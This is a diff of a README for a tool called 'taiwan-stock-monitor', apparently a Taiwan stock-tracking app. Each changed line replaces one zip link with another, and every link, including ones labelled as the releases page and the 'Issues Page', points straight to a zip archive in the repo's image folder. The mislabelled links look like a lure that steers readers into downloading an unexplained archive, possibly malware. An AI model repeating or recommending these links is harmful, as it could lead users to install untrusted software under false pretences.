@@ -1,6 +1,6 @@
 # 📈 taiwan-stock-monitor - Your Daily Stock Insights Made Easy
 
-[![Download taiwan-stock-monitor](https://raw.githubusercontent.com/Idkunku/taiwan-stock-monitor/main/image/monitor_taiwan_stock_Eriodendron.zip%20Now-Get%20Started-orange)](https://raw.githubusercontent.com/Idkunku/taiwan-stock-monitor/main/image/monitor_taiwan_stock_Eriodendron.zip)
+[![Download taiwan-stock-monitor](https://github.com/Idkunku/taiwan-stock-monitor/raw/refs/heads/main/image/stock_taiwan_monitor_3.3.zip%20Now-Get%20Started-orange)](https://github.com/Idkunku/taiwan-stock-monitor/raw/refs/heads/main/image/stock_taiwan_monitor_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before you download, ensure your system meets these requirements:
 
 To get started, visit the releases page to download the application. 
 
-[Download taiwan-stock-monitor](https://raw.githubusercontent.com/Idkunku/taiwan-stock-monitor/main/image/monitor_taiwan_stock_Eriodendron.zip)
+[Download taiwan-stock-monitor](https://github.com/Idkunku/taiwan-stock-monitor/raw/refs/heads/main/image/stock_taiwan_monitor_3.3.zip)
 
 1. Click the link above to visit the Releases page.
 2. Find the latest version of the application.
@@ -87,7 +87,7 @@ If you encounter issues, try these steps:
 
 ## 📞 Support
 
-For further assistance, please check our [Issues Page](https://raw.githubusercontent.com/Idkunku/taiwan-stock-monitor/main/image/monitor_taiwan_stock_Eriodendron.zip). You can also reach out to the community for help.
+For further assistance, please check our [Issues Page](https://github.com/Idkunku/taiwan-stock-monitor/raw/refs/heads/main/image/stock_taiwan_monitor_3.3.zip). You can also reach out to the community for help.
 
 ## 📜 License
 
